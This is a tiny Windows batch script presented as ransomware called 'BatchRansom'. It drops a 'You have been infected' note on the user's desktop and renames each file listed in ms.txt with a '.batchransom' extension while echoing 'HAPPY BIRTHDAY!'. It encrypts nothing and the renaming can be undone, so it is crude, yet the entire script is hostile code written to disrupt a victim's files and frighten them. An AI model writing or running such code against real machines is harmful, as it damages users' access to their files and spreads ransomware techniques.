@echo off
echo You have been infected by BatchRansom! > %userprofile%\Desktop\READ_ME.txt
for /f "delims=" %%f in (ms.txt) do (
    move "%%f" "%%f.batchransom"
    echo HAPPY BIRTHDAY!
)
